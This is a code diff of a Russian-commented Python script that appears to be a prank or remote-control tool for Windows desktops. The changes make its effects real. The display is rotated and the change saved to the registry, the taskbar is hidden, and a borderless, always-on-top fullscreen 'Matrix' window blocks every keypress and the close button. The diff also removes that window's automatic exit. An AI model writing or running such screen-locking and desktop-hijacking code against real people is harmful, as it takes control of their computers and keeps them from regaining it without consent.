@@ -1398,10 +1398,63 @@ def flip_screen():
     try:
         import ctypes
         user32 = ctypes.windll.user32
-        user32.ChangeDisplaySettingsExW(None, None, None, 0, None)
-        return "✅ Экран перевёрнут!"
-    except:
-        return "❌ Ошибка"
+        # Получаем текущие настройки экрана
+        class DEVMODE(ctypes.Structure):
+            _fields_ = [
+                ("dmDeviceName", ctypes.c_wchar * 32),
+                ("dmSpecVersion", ctypes.c_ushort),
+                ("dmDriverVersion", ctypes.c_ushort),
+                ("dmSize", ctypes.c_ushort),
+                ("dmDriverExtra", ctypes.c_ushort),
+                ("dmFields", ctypes.c_ulong),
+                ("dmOrientation", ctypes.c_short),
+                ("dmPaperSize", ctypes.c_short),
+                ("dmPaperLength", ctypes.c_short),
+                ("dmPaperWidth", ctypes.c_short),
+                ("dmScale", ctypes.c_short),
+                ("dmCopies", ctypes.c_short),
+                ("dmDefaultSource", ctypes.c_short),
+                ("dmPrintQuality", ctypes.c_short),
+                ("dmColor", ctypes.c_short),
+                ("dmDuplex", ctypes.c_short),
+                ("dmYResolution", ctypes.c_short),
+                ("dmTTOption", ctypes.c_short),
+                ("dmCollate", ctypes.c_short),
+                ("dmFormName", ctypes.c_wchar * 32),
+                ("dmLogPixels", ctypes.c_ushort),
+                ("dmBitsPerPel", ctypes.c_ulong),
+                ("dmPelsWidth", ctypes.c_ulong),
+                ("dmPelsHeight", ctypes.c_ulong),
+                ("dmDisplayFlags", ctypes.c_ulong),
+                ("dmDisplayFrequency", ctypes.c_ulong),
+                ("dmICMMethod", ctypes.c_ulong),
+                ("dmICMIntent", ctypes.c_ulong),
+                ("dmMediaType", ctypes.c_ulong),
+                ("dmDitherType", ctypes.c_ulong),
+                ("dmReserved1", ctypes.c_ulong),
+                ("dmReserved2", ctypes.c_ulong),
+                ("dmPanningWidth", ctypes.c_ulong),
+                ("dmPanningHeight", ctypes.c_ulong),
+            ]
+        
+        devmode = DEVMODE()
+        devmode.dmSize = ctypes.sizeof(DEVMODE)
+        
+        # Получаем текущие настройки
+        user32.EnumDisplaySettingsW(None, 0xFFFFFFFF, ctypes.byref(devmode))
+        
+        # Меняем ориентацию (0=0°, 1=90°, 2=180°, 3=270°)
+        current = devmode.dmOrientation
+        devmode.dmOrientation = (current + 1) % 4
+        devmode.dmFields = 0x0001  # DM_ORIENTATION
+        
+        result = user32.ChangeDisplaySettingsExW(None, ctypes.byref(devmode), None, 0x0004, None)  # CDS_UPDATEREGISTRY
+        if result == 0:
+            return "🔄 Экран перевёрнут!"
+        else:
+            return f"❌ Ошибка: {result}"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
 
 def invert_colors():
     try:
@@ -1446,21 +1499,61 @@ def matrix_effect():
     try:
         import tkinter as tk
         import random
+        
         root = tk.Tk()
         root.attributes('-fullscreen', True, '-topmost', True)
         root.configure(bg='black')
+        root.attributes('-alpha', 1.0)
+        root.overrideredirect(True)  # Убираем рамку (Alt+F4 не работает)
+        
         canvas = tk.Canvas(root, bg='black', highlightthickness=0)
         canvas.pack(fill=tk.BOTH, expand=True)
-        chars = "0123456789ABCDEF"
-        for _ in range(200):
-            x = random.randint(0, root.winfo_screenwidth())
-            y = random.randint(0, root.winfo_screenheight())
-            canvas.create_text(x, y, text=random.choice(chars), fill='green', font=('Courier', 20))
-        root.after(10000, root.destroy)
+        
+        width = root.winfo_screenwidth()
+        height = root.winfo_screenheight()
+        font_size = 20
+        cols = width // font_size
+        rows = height // font_size
+        
+        columns = []
+        for _ in range(cols):
+            columns.append({
+                'pos': random.randint(0, rows),
+                'length': random.randint(5, 15),
+                'speed': random.randint(1, 3),
+                'chars': []
+            })
+        
+        # Блокируем все возможные способы закрытия
+        def block_close(event):
+            return "break"  # Блокируем любое нажатие клавиш
+        
+        root.bind('<Key>', block_close)          # Блокируем все клавиши
+        root.protocol("WM_DELETE_WINDOW", lambda: None)  # Блокируем крестик
+        
+        def draw_matrix():
+            canvas.delete("all")
+            
+            for i, col in enumerate(columns):
+                x = i * font_size
+                col['pos'] = (col['pos'] + col['speed']) % (rows + col['length'])
+                
+                for j in range(col['length']):
+                    row = (col['pos'] - j) % rows
+                    y = row * font_size
+                    char = random.choice('0123456789ABCDEF')
+                    brightness = 255 - (j / col['length']) * 200
+                    color = f'#{int(brightness):02x}{int(brightness):02x}{int(brightness*0.5):02x}'
+                    canvas.create_text(x, y, text=char, fill=color, font=('Courier', font_size, 'bold'))
+            
+            root.after(80, draw_matrix)
+        
+        draw_matrix()
         root.mainloop()
-        return "🌀 Эффект 'Матрица' активирован!"
-    except:
-        return "❌ Ошибка"
+        
+        return "🌀 Настоящий эффект 'Матрица' активирован!"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
 
 def screen_shake():
     try:
@@ -1916,10 +2009,16 @@ def show_notification(text):
 
 def hide_taskbar():
     try:
-        ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
-        return "✅ Панель задач скрыта!"
-    except:
-        return "❌ Ошибка"
+        user32 = ctypes.windll.user32
+        # Находим панель задач
+        hwnd = user32.FindWindowW("Shell_TrayWnd", None)
+        if hwnd:
+            # Скрываем (0 = SW_HIDE)
+            user32.ShowWindow(hwnd, 0)
+            return "✅ Панель задач скрыта!"
+        return "❌ Панель задач не найдена"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
 
 def restart_explorer():
     try:
